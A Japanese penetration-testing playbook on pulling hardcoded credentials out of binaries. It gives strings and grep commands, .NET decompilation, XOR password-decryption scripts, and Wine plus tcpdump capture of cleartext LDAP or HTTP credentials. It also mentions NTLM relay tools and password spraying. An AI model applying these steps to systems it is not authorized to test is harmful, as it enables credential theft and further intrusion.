# バイナリ解析・ハードコード認証情報の抽出

## 概要

実行ファイルや DLL にハードコードされた認証情報・接続先・暗号化ロジックを調査する手法。特に .NET バイナリは逆コンパイルが容易で、認証情報が見つかりやすい。

---

## パターン1: strings コマンドによる文字列抽出

### 着火条件
バイナリファイル（.exe, .dll, ELF等）が取得できた場合。まず最初に試す。

### 観点・着眼点

**何が出たら次に何をするか：**

| 観測される出力 | 示唆 | 次のアクション |
|------------|-----|------------|
| `ldap://...` / `smb://...` 等の URL | 接続先サーバーの特定 | その接続先に対してアクセス経路を検討 |
| `password=`, `pwd:`, `apikey=` のような代入形式 | ハードコード認証情報 | そのまま認証情報として試す |
| Base64 っぽい長い文字列（末尾 `=`） | 暗号化 / エンコード済みデータ | `base64 -d` で復号 → バイナリか・文字列か判定 |
| `mscoree.dll` / `.NETFramework` / `mscorlib` | .NET バイナリ確定 | パターン2（逆コンパイル）に進む |
| `UPX!` / `packed` / 高エントロピー | パックされている | `upx -d` で解凍 → 再度 strings |
| ASCII は出ないが UTF-16LE では出る | Windows バイナリ典型 | `strings -e l` で再試行 |
| XOR キーらしき短い文字列 + Base64 データ | 簡易暗号化の痕跡 | パターン3（XOR 復号）に進む |

**なぜ strings を最初にやるのか：** 逆コンパイル・デバッガ不要で数秒で終わる。ハードコード認証情報の 7 割はこの段階で見つかる。

### 手順

```bash
# ASCII文字列の抽出
strings [binary_file] | grep -i "pass\|user\|key\|secret\|token\|ldap\|http"

# Unicode（UTF-16LE）文字列の抽出（Windowsバイナリに有効）
strings -e l [binary_file] | grep -i "pass\|user\|key"

# Python で UTF-16LE を確実に抽出
python3 -c "
with open('[binary_file]', 'rb') as f:
    data = f.read()
import re
utf16_strings = re.findall(b'(?:[\x20-\x7e]\x00){4,}', data)
for s in utf16_strings:
    decoded = s.decode('utf-16-le', errors='ignore')
    if any(kw in decoded.lower() for kw in ['pass', 'user', 'ldap', 'key', 'secret']):
        print(repr(decoded))
"
```

---

## パターン2: .NET バイナリの逆コンパイル

### 着火条件
`.exe` が .NET アプリケーションの場合（`strings` で `mscoree.dll` や `.NETFramework` が見える）。

### 観点・着眼点
- .NET バイナリは IL（中間言語）にコンパイルされており、**ほぼ完全にソースコードを復元できる**
- 暗号化された認証情報でも、**暗号化ロジック自体がコード内にある**ため復号できる
- 接続先URL（LDAP, SMB, HTTP）、ユーザー名、暗号化されたパスワードを探す

### 手順

**Linux環境での逆コンパイル（ilspycmd）：**
```bash
# ilspycmd のインストール
dotnet tool install ilspycmd -g

# 逆コンパイル
ilspycmd [binary.exe] -o ./decompiled/

# 出力されたC#コードを確認
grep -r "password\|ldap\|encrypt\|decrypt\|xor" ./decompiled/ -i
```

**Windows環境での逆コンパイル（dnSpy / ILSpy）：**
GUI ツールで `.exe` を開き、クラス一覧から認証関連のクラスを探す。

---

## パターン3: XOR暗号化されたパスワードの復号

### 着火条件
バイナリ中に Base64 エンコードされた文字列と、短いキー文字列が見つかった場合。

### 観点・着眼点

**何が出たら次に何をするか：**

| 観測される出力 | 示唆 | 次のアクション |
|------------|-----|------------|
| 逆コンパイルコードに `Convert.FromBase64String` + `^` 演算子 | Base64 → XOR の典型構造 | 下の復号スクリプトにパラメータを差し替えて実行 |
| XOR キーがソースコードに平文で書かれている | 復号に必要な情報が揃った | そのまま復号して平文パスワード取得 |
| XOR キーが別関数で動的生成（`Environment.MachineName` 等） | 実行環境依存 | 実機と同じ値を与えるか、デバッガで実行時キーを取得 |
| キーらしき文字列が複数候補 | どれが XOR キーか不明 | 全候補で総当たり → 印字可能文字列になるものを採用 |
| 復号結果が一部だけ印字可能（先頭が崩れる） | 追加の magic byte が入っている | magic byte を 0x00〜0xFF で総当たり |
| 復号結果にヌルバイトが混ざる | UTF-16LE の可能性 | `.decode('utf-16-le')` で再解釈 |

**なぜ簡易 XOR が残り続けるか：** 開発者が「難読化すれば十分」と判断しているケースが多い。コード内にキーがあるので数学的には必ず解ける。

**簡易 XOR を特定する手順：**
1. 暗号化されたデータ（Base64文字列）
2. XORキー（短い文字列）
3. 追加のXORマジックバイト（`0xdf` など定数）

の3つを特定して復号する。

### 手順

**典型的なXOR復号パターン：**
```python
import base64

enc_password = '[BASE64_ENCODED_STRING]'
key = '[XOR_KEY]'
magic_byte = 0xdf  # バイナリから特定した定数（ない場合もある）

decoded = base64.b64decode(enc_password)
key_bytes = key.encode('ascii')
result = []
for i, b in enumerate(decoded):
    decrypted = b ^ key_bytes[i % len(key_bytes)] ^ magic_byte
    result.append(decrypted)

print('復号結果:', bytes(result).decode('utf-8'))
```

**magic_byte がわからない場合：**
```python
# 0x00 〜 0xff を総当たり
for magic in range(256):
    try:
        result = bytes([b ^ key_bytes[i % len(key_bytes)] ^ magic for i, b in enumerate(decoded)])
        decoded_str = result.decode('utf-8')
        if decoded_str.isprintable():
            print(f'magic=0x{magic:02x}: {decoded_str}')
    except:
        pass
```

---

## パターン4: バイナリ実行 + ネットワークキャプチャによるクレデンシャル取得

### 着火条件

以下のどちらかが当てはまる場合に試す：

- 逆コンパイルで暗号化ロジックが複雑すぎて復号が難しい
- バイナリが外部サービス（LDAP・SMB・HTTP 等）に接続する動作を確認した

**攻撃者の思考トレース：** 「解読できなくても、実際に動かしてネットワークを見れば認証情報が流れる」。
バイナリは接続の際に認証情報を送信しなければサービスと通信できない。
暗号化していない LDAP Simple Authentication（平文バインド）や HTTP Basic 認証はパケット上にそのまま現れる。
逆コンパイルと並行して、または逆コンパイルが難しい場合の代替として試す。

### 環境前提

- 実行環境: テスター端末（Linux）
- 必要なツール:
  - `wine`（Linux上でWindowsバイナリを実行するエミュレーター。別途インストール要）
  - `tcpdump`（ペネトレ用Linuxディストリ標準搭載）または WireShark（GUI。別途インストール可）
- ネットワーク: バイナリが接続しようとするサービス（LDAP 389等）がテスター端末から到達可能であること

### 観点・着眼点

**何が出たら次に何をするか：**

| 観測される出力 | 示唆 | 次のアクション |
|------------|-----|------------|
| LDAP `bindRequest` パケットが見える | 認証情報が平文で流れている | `authentication` フィールドからパスワードを取得 |
| LDAP `bindResponse resultCode: success` | バインド成功。認証情報が正しい | 取得したユーザー名・パスワードで LDAP 列挙へ |
| SMB `NTLMSSP_AUTH` パケットが見える | NTLMハッシュが流れている | Responder / impacket-ntlmrelayx でリレー攻撃も検討 |
| HTTP `Authorization: Basic` ヘッダーが見える | Base64エンコードの平文認証 | `echo '[BASE64]' \| base64 -d` で復号 |
| ツールが `Connect error` / 名前解決失敗 | 接続先のホスト名を解決できていない | バイナリ内のホスト名を確認し `/etc/hosts` に登録してから再試行 |
| バイナリが即終了・無応答 | Wine非対応の依存DLLが不足している可能性 | `wine [binary] 2>&1 \| grep -i err` でエラーを確認。不足DLLをインストール |

**先に確認すること：**
バイナリが接続先に実際に到達できる状態になっているかを先に確認する（`/etc/hosts` への登録、対象サービスへの疎通）。
到達できない状態でキャプチャしてもパケットは流れない。

### 手順

**Step 1: バイナリの接続先ホスト名を特定して登録する**

```bash
# [Attacker] strings またはパターン1・2の逆コンパイル結果から接続先ホスト名を確認
strings [binary_file] | grep -iE "ldap://|smb://|://[a-z]"

# [Attacker] 判明したホスト名を登録（案件識別子マーカー付き）
echo "192.0.2.10  [HOSTNAME]  # kedalab-[CASE_ID]" | sudo tee -a /etc/hosts
```

**Step 2: キャプチャを開始してからバイナリを実行する**

```bash
# [Attacker] tcpdump でキャプチャ開始（別ターミナルで）
# インターフェース名は環境により異なる。`ip a` で到達可能なインターフェースを確認する
sudo tcpdump -i [INTERFACE] -w /tmp/capture.pcap port 389 or port 445 or port 80 or port 443

# [Attacker] Wine でバイナリを実行（上記と別ターミナルで）
wine [binary_file] [options]
```

> **`[INTERFACE]` について：** テスター端末から対象サービスに到達できるインターフェース（環境によって物理 NIC・VPN アダプター・専用線インターフェース等が異なる）。`ip a` で全インターフェースを確認してから指定する。

**Step 3: pcap を解析する**

```bash
# [Attacker] tshark でクイック解析（WireShark の CLI 版。別途インストール要）
tshark -r /tmp/capture.pcap -Y "ldap.bindRequest" -T fields \
  -e ldap.name -e ldap.simple

# または WireShark GUI で開いて以下を確認
# LDAP の場合：
#   Lightweight Directory Access Protocol → protocolOp → bindRequest → authentication
# HTTP Basic の場合：
#   Authorization: Basic [BASE64] を右クリック → Follow HTTP Stream
```

**LDAP Simple Authentication の例（tcpdump の出力イメージ）：**

```
# WireShark での表示例：
# Lightweight Directory Access Protocol
#   └─ LDAPMessage bindRequest(1) "[DOMAIN]\[USER]" simple
#        ├─ messageID: 1
#        └─ protocolOp: bindRequest (0)
#             └─ authentication: simple (0)
#                  └─ simple: [PASSWORD]
```

### 刺さらなかったとき

| 状況 | 原因・対処 |
|------|-----------|
| パケットが一切流れない | バイナリが接続に失敗している。`/etc/hosts` の登録・疎通確認を先に行う |
| LDAP パケットが見えるが authentication が暗号化されている | `SASL/GSSAPI` 等の暗号化バインドが使われている。パターン2（逆コンパイル）での鍵取得が必要 |
| Wine がクラッシュ・依存DLLエラー | 特定の Windows ランタイムが必要。`winetricks` で依存コンポーネントを追加するか、実 Windows 環境で実行する |
| バイナリが64bit でWineが32bitモード | `WINEARCH=win64 wine [binary]` で64bitモードを指定する |

### 注意点・落とし穴

- LDAP over TLS（LDAPS / ポート636）や Kerberos 認証を使っている場合は平文パケットが得られない。その場合はパターン2（逆コンパイル）でクレデンシャルを復元する
- Wine はWindowsバイナリの完全エミュレーターではないため、一部のバイナリは動作が異なることがある（ネットワーク送信前の処理が途中で止まる等）。パターン2との並行実施を推奨する
- キャプチャには root 権限が必要（sudo tcpdump）。書き込み先（`/tmp/capture.pcap`）の権限も確認する
- 原状回復：`/etc/hosts` に追記した行を削除する
  ```bash
  sudo sed -i.bak '/# kedalab-\[CASE_ID\]/d' /etc/hosts
  ```

---

## 注意点・落とし穴

- `strings` だけでは UTF-16LE エンコードの文字列を見逃すことが多い（Windowsバイナリは UTF-16LE を多用）
- `.NET` バイナリかどうかは `file` コマンドや PE ヘッダーの確認（`strings` 結果に `.NETFramework` が含まれるか）で判断
- 暗号化ロジックが複数層になっている場合もある（Base64 → XOR → Base64 など）

---

## 関連技術
- 前：SMB共有からバイナリを取得した → `../../01_Reconnaissance/SMB_Enumeration.md`
- 復号・キャプチャした認証情報の使い回し確認 → `../Credential_Discovery.md`
- LDAP接続先が判明した → `../../01_Reconnaissance/LDAP_Enumeration.md`
- 後：取得した認証情報でパスワードスプレー → `../../05_Tools_Reference/Netexec.md`
